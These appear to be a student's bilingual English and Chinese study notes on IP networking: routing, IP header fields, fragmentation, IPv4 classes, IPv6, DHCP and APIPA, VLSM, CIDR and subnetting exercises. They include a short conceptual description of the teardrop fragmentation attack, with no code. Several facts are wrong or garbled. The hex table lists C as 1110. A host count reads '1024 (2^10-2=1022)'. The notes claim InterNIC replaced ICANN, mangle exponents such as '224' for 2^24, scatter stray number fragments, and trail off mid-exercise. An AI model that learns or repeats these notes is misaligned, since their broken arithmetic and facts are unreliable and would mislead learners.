Metaphorically, you could visualize message switching like routing an e-mail message, where the e-mail message might be briefly stored on an e-mail server before being forwarded to the recipient.
Router:
- discovery and selection:
  - how to reach various network addresses.
  - maintain a routing table, have its routing table populated via:
  - manual configuration (entering static routes),
  - dynamic routing protocol (example, RIP, OSPF, or EIGRP),
  - or simply directly connected to certain networks.
  - send packet based on the packet’s destination network address.
- Connection services:
  - provided connection services for flow control and error control (like the data link layer)
  - Can improve the communication reliability, even the data link’s LLC sublayer not perform connection services.
The following functions are performed by connection services at the network layer:
- Flow control (congestion control):
  - Helps prevent a sender send data faster than the receiver is capable to receive the data.
- Packet reordering:
  - Allows packets to be placed in the appropriate sequence as they are sent to the receiver. (This might be necessary, because some networks support load-balancing, where multiple links are used to send packets between two devices. Because multiple links are used, packets might arrive out of order.) ▪


## IP Internet Protocol (IP)
the network-level protocol:
performs a best effort to route a data packet from a source node to a
destination node in the Internet.
every node is given a unique numerical address   - Ipv4. 32-bit number
  - Network, host portion.   - IPv6. 128-bit number
  - Routing prefix, network address, and a host identifier Any transmission are specified by an IP address.
       ▪


##  Routing IP Packets
A host (PC, server, or smartphone) employs simple algorithm for routing packets from that host:
Check the IP and compare the network mask.
Destinated host on the same LAN:.
  - the packet is transmitted directly on the LAN
  - using ARP protocol to determine the MAC address of the destination machine.
Destinated host not on the same LAN:
  - the packet is transmitted to gateway (handle the next step of the routing). The ARP protocol is used to determine the MAC address of the gateway.
  - Thus, a host: typically stores a list of the IP addresses of machines on its LAN, or a compact description of it, and the IP address of
   ▪


## the gateway.
The default route:
  - Route used as a destination for trafic with an underfined route
  - When defined on a host, generally is the network gateway.
Routers: Gateways and other intermediate network nodes that handle the routing of packets to its destination on the Internet. typically connected
to two or more LANs, use routing tables to determine the next router which packet should be sent.
   ⁃
To prevent the un-routable packets traversing the network forever, each IP packet is given a time-to-live (TTL) count by its source.
  - TTL value: hop limit, max 255 hops
 ▪


##   - decremente by each router that processes the packet.
  - TTL 0: A packet is expired and should be discarded by the router
that sees it.
  - an error packet is sent back to the source.
 The Structure of the Internet
Routers are fast. Performs actions for each packet received: Drop: If the packet is expired.
Deliver: If the destination is a machine on one of the LANs to which the router is connected, deliver packet to the destination.
 ▪


##  Forward: If the destination of the packet does not belong to the LANs of the router, then the packet is forwarded to a neighboring router.
2 primary protocols determine how next hops are encoded in Internet routing tables:
Open Shortest Path First (OSPF)
  - determines how packets are routed in an autonomous system (ASs)
  - based on policy that packets should travel along shortest paths.
Border Gateway Protocol (BGP).
  - determines how packets are routed between autonomous systems (ASs)
  - based on policies dictated by contractual agreements between different ASs The routes established by BGP may not be shortest paths.
IP packet
Each IP packet
a fixed-length header(various fields) + variable-length data portion.
以太网帧:frame_head+frame_data(ip数据报:iphead+ipdata)
the header has specific fields:
  - Version: validating the incoming packets version and thus its structure.
  - header length which is a variable based on the contents of the 2,282

header.
  - the total length of the IP packet being transmitted. to fragment data transmissions into smaller ones that fit into our layer two's MTU. This can be up to 64 kilobytes.
  - a unique identifier for the entire fragmentation sequence
  - flags to know if this packet is part of a fragmented sequence or if it's the last fragment in a sequence and also there's a bit in here to tell IP, don't fragment a packet if that's needed by the application.
  - fragmentation offset: the byte position of this packet in the original unfragmented IP packet. And so when an IP packet needs fragmentation the host or the router will break up the data into IP fragments and manipulate this header information to fragment and then reassemble the packets on the remote host or network.
  - TTL.
  - protocol, the layer four transport layer protocol so this is going to
be something like TCP, UDP or ICMP
  - the source IP address, the destination IP address. ▪


##  版本:4bit，指 IP 协议的版本号。IPV4/IPV6。在进行通信时，通信双方的 IP 协 议版本号必须一致，否则无法直接通信。
首部⻓度:4bit，指 IP 报文头的⻓度。最大的⻓度(即 4 个 bit 都为 1 时)为 15 个 ⻓度单位，每个⻓度单位为 4 字节(TCP/IP 标准，DoubleWord)，所以 IP 协议 报文头的最大⻓度为 60 个字节，最短为上图所示的 20 个字节。
服务类型:8bit，用来获得更好的服务。其中的前 3 位表示报文的优先级，后面 的几位分别表示要求更低时延、更高的吞吐量、更高的可靠性、更低的路由代价 等。对应位为 1 即有相应要求，为 0 则不要求。
总⻓度:16bit，指报文的总⻓度。注意这里的单位为字节，而不是 4 字节，所以 一个 IP 报文的的最大⻓度为 65535 个字节。
   ▪


##  identification:16bit，该字段标记当前分片为第几个分片，在数据报重组时很有 用。
flag:3bit，用于标记该报文是否为分片，后面是否还有分片(是否是最后一个分 片)。
  - 为什么分片: 主要是因为硬件环境的MTU限制。一个IP报文最多可以达到 65565的最大⻓度;但是网络硬件限制了帧的大小(以太网限制为1500字 节)。
  - IP分片如何进行重组: 主要依靠标识(IDENT，用于标识IP报文段的唯一标 识符，具有同一IDENT的片段属于同一个IP报文)、标志(FLAGS，第一 位保留，不使用;第二位为DF(Don't Fragment)位，DF=1时不分片; 第三位为MF(More Fragments)位，DF=0的情况下，除了最后一个分段 的IP包的包头，其他分段的MF位都设为1)与片偏移(FRAGMENT OFFSET:简称FO，指明当前片段在原始完整的IP报文中的位置(偏 移)。该偏移的单位是8个字节。)
片偏移:指当前分片在原数据报(分片前的数据报)中相对于用户数据字段的偏 移量，即在原数据报中的相对位置。
TTL: 8bit，该字段表明当前报文还能生存多久。每经过1ms或者一个网关，TTL 的值自动减1，当生存时间为0时，报文将被认为目的主机不可到达而丢弃。使用
过Ping命令的用户应该有印象，在windows中输入ping命令，在返回的结果中即 有TTL的数值。
协议:8bit，指出在上层(网络 7 层结构或 TCP/IP 的传输层)使用的协议，可能 的协议有 UDP(17)、TCP(6)、ICMP(1)、IGMP(2)、IGP 等。
首部校验和:用于检验 IP 报文头部在传播的过程中是否出错，主要校验报文头中 是否有某一个或几个 bit 被污染或修改了。
源 IP 地址:32bit，4 个字节 目的 IP 地址:32bit，4 个字节
Although it does not guarantee that packet successfully travels from its source
       ▪


## to its destination, IP does provide a detect if packet headers are damaged along the way.
Each IP packet comes with a checksum value, computed in header contents.
Any host or router wishing to confirm that this header is intact simply needs to recompute this checksum function and compare the computed checksum value to the checksum value that is stored inside the packet.
Since some parts of the header, like the time-to-live, are modified with each hop, this checksum value must be checked and recomputed by each router that processes this packet.
The protocol field of an IP packet specifies the higher level protocol that should receive the payload of the packet, such as ICMP, TCP, or UDP.
Flag: 泪滴攻击(tear drop)的原理是什么?
     构造两个分片，满足以下两个条件:1、第一个分片的 FO+len>第二个分片的 FO+len。 ▪


## 2、发生重叠时，使用第一个分片来覆盖第二个分片的重叠内容。
首先，计算到底重叠了多少字节(i)，然后将指向第二个分片的指针朝后移动这么多 字节，也即，忽略了第二个分片的重叠部分，接下来计算第二个分片还剩余多少字节， 并将第二个分片的剩余内容拷⻉一下。但由于不正常重叠后计算第二分片剩余部分的⻓ 度为负数，会造成操作系统瘫痪。
IPv4
Binary Numbering
IP addresses: represented by binary digits (bits).
  - 8 bits = 1 byte.
  - IPv4: dotted decimal notation format.
  - 4 x 8 bytes = 32 bits
  - 255.255.255.255
  - 00000000.00000000.00000000.00000000
  - IPv6: 128 bits.
Principles of Binary Numbering
- Base-10 numbering system: ten digits, 0–9.
- Base-2 numbering system: two digits: zero (0) and one (1).
- converting between 8-bit binary numbers and decimal numbers
  - (1024 512 256) 128 64 32 16 8 4 2 1
  - the 8 bits in an octet.
  - 2^0 - 2^7
Binary to Decimal:
- 10010110 = 128 + 16 + 4 + 2 = 150 Decimal to Binary:
 ▪


## - Is this number equal to or greater than the column heading?
  - No, put 0. Yes, put 1.
  - Example: convert the number 167 to binary.
  - 1. 128 column:
  - 167 greater than 128
⁃1
  - subtract 128 from 167 = 39.
  - 2. 64 column: ⁃0
  - 3. 32 column:
  - 39 greater than 32 ⁃1
  - subtract 32 from 39 = 7.
  - 4. 16 column: ⁃0
  - 5. 8 column ⁃0
  - 6. 4 column:
  - 7 is greater than or equal to 4 ⁃1
  - 4 is subtracted from 7 = 3.
  - 7. 2 column,
  - 3 greater than 2
⁃1
  - 2 is subtracted from 3 = 1.   - 8. 1 column
  - 1 is equal to 1
⁃1
  - decimal number 167 = binary value of 10100111
  - 128 + 32 + 4 +2 + 1 = 167. IPv4 Addressing
IPv6 is increasingly being adopted in corporate networks,
IPv4 (IP address) is by far the most popular Layer 3 addressing scheme in today’s networks.
Devices on an IPv4 network use unique IP addresses to communicate with one another
 ▪


##  When IPv4 network device sends data on a network, it places both a destination and a source IP address in the packet’s IPv4 header.
IPv4 Address Structure
IPv4 address: 32-bit address.
written in dotted-decimal notation 点分十进制.
divided into 4 section, 8 bits, each is a Octets 八位字节
  - 00000001 in binary equates to a 1 in decimal.
  - 00000010 in binary equals 2 in decimal
  - 00000011 yields a decimal value of 3.
IP addresses has 2 portions
  - a network portion that denotes an IP prefix used by all machines on
a particular network
  - a host portion which identifies a particular network device.
  - network, subnet, and host
  - 128.148.32.110
These two portions are differentiated by providing a subnet mask along with the IP address.
  - Subnet mask:
  - determines which bits refer to the network and which bits refer to the
host.
  - consists of a series of contiguous 1s and 0s.
  - 1s: network bits in an IPv4 address,
  - 0s: host bits in an IPv4 address.
  - classful mask: original mask.
The network portion: ANDing the subnet mask with the IP address, the host portion: XORing network portion with the IP address.
Network address: X.X.X.0 Broadcast address: X.X.X.255
         ▪


##  When writing a network address, needs to provide more detail
  - 10.1.2.3, 255.0.0.0
  - or 10.1.2.3 /8.
Classes of Addresses
 0.0.0.0:network
255.255.255.255: 当前子网的广播地址。
Private use:
  - 10.0.0.0/8
  - 169.254.0.0–169.254.255.255 address is not routable.
  - 172.16.0.0/12 - 172.31.0.0/12
  - 192.168.0.0/16
  - many home router use 192.168.0.1 or 192.168.1.1.
  - not routable outside of a LAN: ISPs do not route these private
networks over the public Internet.
  - only usable on their local subnet and are dynamically assigned to
network hosts using the Automatic IP Address Assignment (APIPA) feature.
Public adress:
   ▪


##   - Assigned by ISP who get them form IANA.
 Class A network (1.0.0.0 - 126.0.0.0)
  - 可用的A类网络有126个，每个网络能容纳1亿多个主 机。
  - 224(3x8) = 16, 777, 216 unique IP addresses.
  - Mask: X.0.0.0 (the largest, subnet mask at least 24 bits)
  - typically reserved for government organizations or telecommunications companies.
Class B networks (128.0.0.0 - 191.255.255.255)
  - Mask: X.X.0.0 (16-bit subnet mask)
  - 216(2x8) = 65, 536 unique IP addresses
  - typically allocated for ISPs and large businesses.
Class C networks (192.0.0.0 - 223.255.255.255)
  - Mask: X.X.X.0 (a 24-bit subnet mask)
  - 28 = 256 unique addresses, 254 usable IP addresses.
  - assigned to smaller organizations.
Class D addresses:
  - For destination IP addresses
   ▪


##   - not assigned to devices sourcing traffic for multicast networks. Class E addresses:
  - for experimental use.
loopback IP address
in the first octet, the number 127 have been skipped.
127: loopback IP address, IP address representing the device itself.
example
  - Want to verify a network device had a TCP/IP stack loaded,
  - you could ping IP address: 127.1.1.1.
  - If you received ping responses, you could conclude that the device is
running a TCP/IP stack.
IPv6
IPv6 Address Structure
address format, where X = a hexadecimal digit in the range of 0 – F:
◦ HHHH:HHHH:HHHH:HHHH:HHHH:HHHH:HHHH:HHHH
◦ eight fields, each field four hexadecimal digits.
◦ A hexadecimal digit is 4 bits in size (4 binary bits can represent 16
values).
◦ 0 0000
◦ 1 0001
◦ ......
◦ 9 1001
     ▪


## ◦ A 1010 ◦ B 1011 ◦ C 1110 ◦ D 1101 ◦ E 1110 ◦ F 1111
- IPv6: 128-bit address:
◦ 4 bits * 4 digits * 8 fields = 128 bits
- IPv6 addresses can be difficult to work with because of their size.
- rules for abbreviating:
◦ Leading 0s in a field can be omitted.
◦ Contiguous fields containing all 0s can be represented with a double
colon.
(Can be done only once for a IPv6 address.) - Example:
◦ IPv6 address:
▸ ABCD:0123:4040:0000:0000:0000:000A:000B ▸ Using the rules for abbreviation
- ABCD:123:4040::A:B
Also, the Extended Unique Identifier (EUI-64) format can be used to cause a router to automatically populate the low-order 64 bits of an IPv6 address based on an interface’s MAC address.
Major Features
- 128-bit addresses
  - IPv4 32-bit, rapidly becoming extinct.
  - IPv6 128-bit provides enough IP addresses for many generations to
come.
  - increases the number of available IP addresses.
  - offers approximately 5 * 1028 IP addresses for each person on the planet.
 ▪


## - subnetting is supported in the address format: leaving 16 bits (2^16) of the address up to individuals or organizations, no need for non routable addresses or network classes.
- allow hierarchical addressing schemes for organizations: reduce the size of routing tables and provide more efficient routing.
- simplified packet headers: make processing at intermediate nodes faster.
  - IPv4 header uses 12 fields
  - IPv6 header uses 5 fields
- Multicast: allows multiple destinations with out the overhead of either
multiple send packets or broadcast messages.
  - No broadcasts
  - No fragmentation (performs MTU discovery for each session)
  - Can coexist with IPv4 during a transition
  - Dual stack (running IPv4 and IPv6 simultaneously)
  - IPv6 over IPv4 (tunneling IPv6 over an IPv4 tunnel)
- Real-time service
- IP Security (IPSec): an integral part of IPv6, and provides confidentiality, authentication, and integrity
- Authentication and security
- Auto-configuration
- End-to-end fragmentation
- Enhanced routing functionality, including support for mobile hosts
when designing IPv4 network, good to consider how readily an IPv6 addressing scheme could be overlaid on that network at some point in the future.
ICMPv6 assumes additional roles on the network.
As a result, when using ICMPv6 ARP and IGMP are no longer necessary.
 ▪


## IPv6 Data Flows
IPv6 has three types of data flows:
  - Unicast
  - Multicast
  - Anycast
Unicast
  - single IPv6 address is applied to a single interface.
  - one-to-one communication flow.
Multicast
  - single IPv6 address represent multiple devices (multicast group)
  - The communication flow is one-to-many.
  - Example
  - a server (AAAA::1) is sending traffic to a multicast group (FF00::A).
  - Two clients (AAAA::2 and AAAA::3) have joined this group.
  - Those clients receive the traffic from the server, while any
client that did not join the group (example, AAAA::4) does not receive the traffic.
Anycast
  - a single IPv6 address is assigned to multiple devices,
  - The communication flow is one-to-nearest (from the perspective of a
router’s routing table).
  - Example:
  - client with an IPv6 address of AAAA::1
  - wants to send traffic to a destination IPv6 address of AAAA::2.
  - server A and server B both have an IPv6 address of AAAA::2.
  - The traffic destined for AAAA::2 is sent to server A, via router
R2.
  - because the network on which server A resides appears to be
closer than the network on which server B resides,
  - from the perspective of router R1’s IPv6 routing table. ⁃
   ▪


## Example of IP attack:
Teardrop attack:
  - malformed fragments can crash or hang older OS that have bot been patched.
  - sending mangled IP fragments with overlapping, oversized payloads to the target machine
  - packet is transmitted to system that is larger than the system can handle, result in a crash.
- Internet Corporation for Assigned Names and Numbers (ICANN),
◦ Internet Network Information Center (InterNIC) replace ICANN (until 09/18/1998).
◦ non-profit corporation.
◦ Publicly routable IP addresses are globally managed by the
ICANN
◦ ICANN does not directly assign a block of IP addresses to your
Internet service provider (ISP), but assigns a block of IP
addresses to a regional Internet registry.
▸ One example:
▸ American Registry for Internet Numbers (ARIN), Internet
registry for North America.
- Internet Assigned Numbers Authority (IANA):
◦ another entity responsible for IP address assignment.
◦ IANA is operated by ICANN and is responsible for IP address
assignment outside of North America.
- When an organization is assigned one or more publicly routable IP addresses by its service provider, that organization often needs more IP addresses to accommodate all of its devices.
◦ One solution is to use private IP addressing within an organization, in combination with Network Address Translation (NAT).
▸ NAT is a feature available on routers.
- allows private IP addresses used within an organization to
 be translated into a pool of one or more publicly routable IP addresses.
- Types of Addresses
- three categories of IPv4 addresses: unicast, broadcast, and multicast.
- Unicast (traffic)
◦ Most network traffic is unicast in nature
◦ traffic travels from a single source device to a single destination
device.
- Broadcast (traffic)
◦ traffic travels from a single source to all destinations on a network (a broadcast domain).
◦ A broadcast address: 255.255.255.255.
▸ all hosts on all interconnected network.
▸ 255.255.255.255 targets all devices on a single network,
specifically the network local to the device sending a
packet destined for 255.255.255.255.
◦ Another type of broadcast address is a directed broadcast address:
X.X.X.255
▸ all devices in a remote network. ▸ example,
- Address 172.16.255.255 /16
- a directed broadcast targeting all devices in the
172.16.0.0 /16 network.
- Multicast (traffic)
◦ an efficient mechanism for a single host to send traffic to multiple or specific destinations.
◦ Example:
▸ network with 100 users. 20 users want to receive a video
stream from a video server. ▸ With a unicast solution:
- the video server have to send 20 individual streams, one stream for each recipient.
◦ consume network bandwidth
◦ put a heavy processor burden on the video server. ▸ With a broadcast solution:
- the video server would only have to send the video stream once;
- however, it would be received by every device on the local subnet, even devices not wanting to receive the video stream. - For devices do not want to receive the video stream, they have to pause what they are doing and take time to check each of these unwanted packets.
- multicast:
◦ allowing the video server to send the video stream only once,
◦ and only sending the video stream to devices on the network that
wants to receive the stream.
- What makes this possible is the use of a Class D address.
◦ A Class D address, such as 239.1.2.3, represents the address of a multicast group.
◦ The server could send a single copy of each stream packet destined for 239.1.2.3.
◦ Devices wanting to receive the stream can join the multicast group.
◦ Based on the device request, switches and routers in the topology
then dynamically determine out of which ports the video stream should be forwarded.
Assigning IPv4 Addresses
IP Addressing Components
- IP address: a network portion + a host portion.
- A subnet mask is required to delineate between these two portions.
- If traffic is destined for a different subnet than the subnet on which the
traffic originates, a default gateway needs to be defined.
◦ routes traffic from the sender’s subnet towards the destination
subnet.
- Another consideration is that end users typically do not type in the IP
address of the destination device with which they want to connect (a web server on the Internet). Instead, end users typically type in fully qualified domain names (FQDN), such as www.1ExamAMonth.com. When connecting to devices on the public Internet, a Domain Name System (DNS) server takes a FQDN and translates it into a corresponding IP address.
- In a company’s internal network (intranet), a Microsoft Windows Internet Name Service (WINS) server might be used
◦ to convert the names of network devices into their corresponding IP addresses.
◦ example:
▸ you might attempt to navigate to a shared folder of \
\server1\hrdocs. ▸ A WINS server could then be used to resolve the network device name of server1 to a corresponding IP address.
▸ The path of \\server1\hrdocs is in universal naming convention (UNC) form, where you are specifying a network device name ( server1) and a resource available on that device (hrdocs).
- To summarize, network devices (like PC) can benefit from a variety of IP address parameters:
◦ IP address
◦ Subnet mask
◦ Default gateway
◦ Server addresses
Static Configuration
- A simple way of configuring a PC with IP address parameters is statically configure that information.
- example:
◦ Microsoft Windows 7:
▸ Control Panel
▸ - Network and Internet
▸ - Network and Sharing Center
▸ -Change adapter settings
▸ From the Network Connections window, double-click the
network adapter whose settings you want to change ▸ You are then taken to the Local Area Connection Status
window
▸ highlight Internet Protocol Version 4 (TCP/ IPv4) and click
the Properties button.
▸ An IP address, subnet mask, default gateway, and DNS server
information can be entered into the Internet Protocol
Version 4 (TCP/IPv4) Properties window
▸ Although DNS server information can be entered in this
window, more advanced DNS options, and WINS options,
are available by clicking the Advanced... button. ▸ In the Advanced TCP/IP Settings,
▸ DNS tab
- you can add, remove, or reorder DNS servers, in addition to adjusting various other DNS parameters.
- a DNS server: converts a FQDN to an IP address.
- Also, the default gateway and a DNS server might shows the same IP address, but these are not always located on the same device.
▸ WINS tab:
- Windows Internet Name Service (WINS) servers can be
configured.
- a WINS server: converts a NetBIOS computer name to a
corresponding IP address.
Dynamic Configuration
- Statically assigning IP address information to device:
◦ time consuming
◦ error-prone, and lacking in scalability.
- many corporate networks dynamically assign IP address parameters to their devices.
◦ Bootstrap Protocol (BOOTP):
▸ An early option for performing this automatic assignment of IP addresses.
◦ Dynamic Host Configuration Protocol (DHCP):
▸ the most popular approach for dynamic IP address assignment.
BOOTP
- BOOTP: a method of assigning IP address, subnet mask, and default gateway information to diskless workstations.
◦ early days, Microsoft Windows did not natively support TCP/IP.
◦ To add TCP/IP support, an add-on TCP/IP application (like
Trumpet Winsock) could be run.
◦ Such an application would typically support BOOTP.
- When a device need an IP address information:
◦ a BOOTP broadcast would be sent out from the device needing an
IP address.
◦ If a BOOTP server (BOOTPS) received the broadcast, it could
match the source MAC address in the received frame (MAC address of the device) with a corresponding IP address, in a database stored on the BOOTP server.
◦ The BOOTPS would then respond to the requesting client with IP address information.
▸ Because BOOTP requests is broadcast, by default a BOOTP request could not propagate beyond a device’s local subnet. DHCP
forward selected broadcast types, including BOOTP broadcasts.
- Dynamic Host Configuration Protocol (detail in chapter 3)
- more robust than BOOTP.
◦ does not require a statically configured database of MAC address
to IP address mappings.
◦ has a wide variety of options beyond basic IP address, subnet
mask, and default gateway parameters.
◦ example,
▸ a DHCP server can educate a DHCP client about the IP address of a WINS server,
▸ or even an administrator-defined parameter (example, the IP address of a TFTP server from which a configuration file could be downloaded).
- However:
◦ Both BOOTP, DHCP’s initial request is a broadcast,
▸ if that DHCP server is not on the local subnet of the requesting client.
▸ requiring a client’s local router be configured to appropriately forward DHCP requests to a DHCP server.
- Example of DHCP configuration: ◦ Microsoft Windows 7:
▸ -Internet Protocol Version 4 (TCP/IPv4) Properties window ▸ -General Tab
▸ select Obtain an IP address automatically and Obtain DNS
server address automatically.
Reverse Address Resolution Protocol (RARP).
- A protocol rendered obsolete by BOOTP and DHCP.
◦ requested an IP address (from a preconfigured host) that corresponded to a station’s MAC address.
◦ Although RARP did allow a station to dynamically obtain an IP address, both BOOTP and DHCP offer additional features.
- Address Resolution Protocol (ARP)
◦ requests a MAC address that corresponds to a known IP address,
Automatic Private IP Addressing (APIPA)
- feature
◦ If a networked device does not have a statically configured IP
address and is unable to contact a DHCP server, it still might be able to communicate on an IP network.
▸ allows a networked device to self-assign an IP address from
the 169.254.0.0/16 network.
▸ address usable only on the device’s local subnet (the IP
address is not routable). - Microsoft Windows 7
◦ defaults to APIPA, if a client is configured to automatically obtain IP address information, and that client fails to obtain IP address information from a DHCP server.
▸ ▸ ▸
-Internet Protocol Version 4 (TCP/IPv4) Properties window -Alternate Configuration Tab
Automatic private IP address Enabled by Default
- APIPA is a great solution:
◦ quickly setting up a localized network
◦ No needs to configure a DHCP server
◦ No needs to statically assign IP address information.
- However, remains a need:
◦ for devices on this localized network to perform name resolution
and discover network services.
◦ Fortunately, these needs are addressed by Zero Configuration
(Zeroconf). - Zeroconf:
◦ a technology supported on most modern operating systems
◦ performs three basic functions:
▸ Assigning link-local IP addresses:
- link-local IP address: a non-routable IP address usable
only on a local subnet.
- APIPA is an example of a technology that assigns link-
local IP addresses.
▸ Resolving computer names to IP addresses:
- Multicast Domain Name Service (mDNS) is an example of
a technology that can resolve computer names to their corresponding IP address on a local subnet, without the aid of a DNS server or a WINS server.
▸ Locating network services:
- Examples of service discovery protocols:
◦ the standards-based Service Location Protocol (SLP),
◦ Microsoft’s Simple Service Discovery Protocol (SSDP),
◦ Apple’s DNS based Service Discovery (DNS-SD).
◦ devices supporting these three Zeroconf features ▸ When interconnected on a local subnet, ▸ they can dynamically obtain link-local IP addresses, resolve one another’s names to IP addresses, and discover services available on a network.
Classful subnetting leads to inefficient allocation of address.
一、子网划分
好处 :
  1 减少网络流量
  2 优化网络性能
  3 简化管理
  4 可以更灵活方便的形成大覆盖范围的网络
 第一台主机172.16.0.1准备给172.16.0.2发送一个数据包，不知道 172.16.0.2的地址，发广播的话，全网的65534台主机都会收到广 播包。网络的流量就太大了，性能差!
二、变⻓子网掩码(VLSM) variable length subnet masks
在一个层次结构的网络中，可以使用多个不同的掩码，即可以对一
个经过子网划分的网络再次划分。变⻓子网掩码的引入，有效解决
了地址分配的浪费问题。
变⻓子网掩码(Variable length subnet masks)它的出现打破了传 统的以A，B，C，D，E为标准的IP地址划分的方法，缓解IP地址不 足。
 目的还是为了节约IP地址空间，减少路由表大小，只是采用的路由 协议必须能够支持它如:RIPV2，OSPF，EIGRP和BGP。
实现方法也很简单:就是通过主机数量来决定前缀位数
 三、无类域间路由(CIDR) classless inter domain routing
网段划分，除了将大网络拆分之外，也有将小网络组合成大网的需
要。在一个有类别的网络中，路由器决定一个地址的类别，并根据
该类别识别网络和主机。
而CIDR中，路由器使用前缀来描述有多个位是网络位(或称前缀)， 剩下的位则是主机位。CIDR显著提高了IPv4的可扩展性和效率， 通过使用路由聚合(超网)，可有效地减小路由表的大小，节省路由 器的内存空间，提高路由器的查找效率。CIDR技术故常用来减小 路由表的大小。
CIDR指的是不再采用A，B，C类网络的规则，定义前缀相同的一 组网络为一个路由条目，如:190.0.0.0/8 大家乍一看好像是C类 网，但是前缀却是8，这其实是超网的概念，也就是把若干个小的 网络合并成一个大的网络。CIDR是用于帮助减缓IP地址和路由表增 大问题的一项技术。CIDR的理念是多个地址块可以被组合或聚合 在一起生成更大的无类别I P地址集(也就是说允许有更多的主机)。
CIDR，将路由表中的条目汇总，如将多个C类地址汇总为一个B类 地址。把几个ip地址合并成一个ip在外网显示 VLSM，将一个网划分子网，利用网络资源。把一个ip分成几个连 续的ip网段;
好处是:
  1 缩小了路由表
  2 网络流量，CPU和内存的开销更低   3 对网络进行编址时，灵活性更大 我们来看一个例子:
Subnets / subnetworks
- Default subnet masks (classful subnet masks) are not always the most efficient choice.
  - leads to inefficient allocation of address.
- subnet
  - Partitioning large networks:
  - Seperate the portion if the network bits from the host bits.
- (add additional network bits to a subnet masks) extending the subnet mask to
create subnets within a classful network.
- subnet mask
  - define variable partition of host part of class A and B addresses
  - Subnets visible only within site
  - All nodes on a network segemnt has the same mask.
- 4 octets, x eight bits: 4 set of 8 bits = 32 bits. Purpose of Subnetting
- The host bits of an IP address cannot be:
  - all 0s (network address)
  - all 1s (directed broadcast address).
- the number of assignable IP addresses in a subnet:
  - = 2^h - 2
  - (h = number of host bits in a subnet mask)
- Example:
  - a private Class B IP address (172.16.0.0/16) for your internal IP
addressing.
  - not need 65,534 hosts in a single broadcast domain.
  - subnet the network into additional subnetworks.
  - (extending the number of network bits in the network’s subnet mask)
Subnet Mask Notation
000 0 0 0 0 0
0 2 4 8 16 32 64 128 =254
 - the number of bits in a subnet mask can be represented in:
- dotted-decimal notation or prefix notation.
- 255.0.0.0
•
- 255.128.0.0
- 255.192.0.0
- 255.224.0.0
- 255.240.0.0
- 255.248.0.0
- 255.252.0.0
- 255.254.0.0
- 255.255.0.0. •
- 255.255.128.0
- 255.255.192.0
- 255.255.224.0
- 255.255.240.0
- 255.255.248.0
- 255.255.252.0
- 255.255.254.0
- 255.255.255.0
- 255.255.255.128
- 255.255.255.192
- 255.255.255.224
- 255.255.255.240
- 255.255.255.248
- 255.255.255.252
- 255.255.255.254 /31
- 255.255.255.255 /32
- Example:
◦ subnet mask of 255.255.192.0.
▸ The first two octets is 255 = has 16 1s
▸ the third octet value is 192 = has 2 1s
▸ the subnet mask of 255.255.192.0, prefix notation is /18.
Extending a Classful Mask
/8 (Classful subnet mask for Class A networks)
/9 +128
/10 +64
/11 +32
/12 +16
/13 +8
/14 +4
/15 +2
/16 +1 (Classful subnet mask for Class B networks)
/17
/18
/19
/20
/21
/22
/23
/24 (Classful subnet mask for Class C networks)
/25 /26 /27 /28 /29 /30
1000 0000 1100 0000 - The way to take a classful network (a network using a classful subnet mask) ◦ divide that network into multiple subnet by adding 1s to the network’s
classful subnet mask.
- However, the class of the IP address does not change, regardless of the new
subnet mask.
◦ the class of a network is determined by the value of the first octet.
◦ The class of a network has nothing to do with the number of bits in a
subnet.
- Example:
◦ the network 10.2.3.0/24
◦ Has the classful subnet mask of a Class C network (24-bit subnet mask).
◦ the 10.2.3.0/24 network is a Class A network, because the value of the
first octet is 10.
◦ a Class A network that happens to have a 24-bit subnet mask.
Borrowed Bits
- the bits you add
- determines how many subnets are created and the number of usable hosts per
subnet.
Created Subnets
- Number of created subnets = 2^borrowed bits - Example:
  - 192.168.1.0, 28-bit subnet mask.
  - the first octet is 192. Class C network.
  - 24 bits classful subnet mask. 28-bit subnet mask
  - borrowed bits: 4
  - created subnets: 2^4 = 16 subnets.
Available Hosts
- Number of assignable IP address in a subnet = 2^Left host bits - 2 - Example:
  - 192.168.1.0, 28-bit subnet mask.
  - borrowed bits: 4 (24+4=28)
  - Left host bits: 4 (32-28=4)
  - assignable IP addresses in each subnet: 14 (2^4-2=14) ▪


## 172.20.0.0/16 network, B class, want 47 subnets
  - 2^6=64 > 47
  - 16+6=22
  - Subletting: /22, 255.255.252.0
  - the number of borrowed bits: 6
  - Number of subnet: 64
  - Left host bits: 10 (32-22=10)
  - assignable IP addresses in each subnet: 1024 (2^10-2=1022)
New IP Address Ranges
interesting octet: the octet containing the last 1 in the subnet mask.
block size: the increment. (256-decimal value of interesting octet)
the first subnet: set all the borrowed bits to 0.
additional subnets: take the first subnet, counting by the block size increment in the interesting octet.
Example:
A 27-bit subnet mask is applied to a network address of 192.168.10.0/24.
  - 192.168.10.0/24.
  - 8.8.8.8 8.8.8.3 5
  - subnet mask: 11111111.11111111.11111111.1110 0000.
  - interesting octet: the fourth octet (the last 1 in the subnet mask)
  - The decimal value of the fourth octet: 224 .
  - (11100000 in decimal) 128+64+32=224
  - Subnet number: 8 (2^3=8)
  - block size=host size: 32 (256-224=32)
  - The first subnet is 192.168.10.0/27
  - additional subnets: Counting by block size in the interesting octet.
- 192.168.10.0
- 192.168.10.32 - 192.168.10.64 - 192.168.10.96 - 192.168.10.128 - 192.168.10.160 - 192.168.10.192 - 192.168.10.224
     network:192.168.0.0/24, subnet mask: 26-bit.
⁃
⁃
⁃
⁃
  - ⁃
subnet mask: 11111111.11111111.11111111.11 000000.   - 255.255.255.192/26
Subnet number: 4 (2^2=4)
interesting octet: the fourth octet (the last 1 in the subnet mask)
  - The decimal value of the fourth octet: 192 .
  - (11100000 in decimal) 128+64=192
block size=host size: 64 (256-192=64)
The first subnet is 192.168.0.0/26
additional subnets: Counting by block size in the interesting octet.
•
- 192.168.0.0
- 192.168.0.64
- 192.168.0.128
- 192.168.0.192
the range of usable addresses
192.168.0.1 - 192.168.0.62 192.168.0.65 - 192.168.0.126 192.168.0.129 - 192.168.0.190 192.168.0.193 - 192.168.0.254
broadcast address
192.168.0.63 192.168.0.127 192.168.0.191 192.168.0.255
subnetted the 172.16.0.0/16 network, by using a 20-bit subnet mask.
  - two VLANs (two subnets) are currently configured;
  - Which client PC is assigned an incorrect IP address?
172.16.0.0/16 network by using a 20-bit subnet mask. B class, 8.8.0.0 to 8.8.4 4.8
- - - - - - - - - •
172.16.0.0 172.16.16.0 172.16.32.0 172.16.48.0 172.16.64.0 172.16.80.0
172.16.96.0
172.16.80.2/20 client 1 and 172.16.95.7/20 client 2 172.16.90.255/20 VLAN A
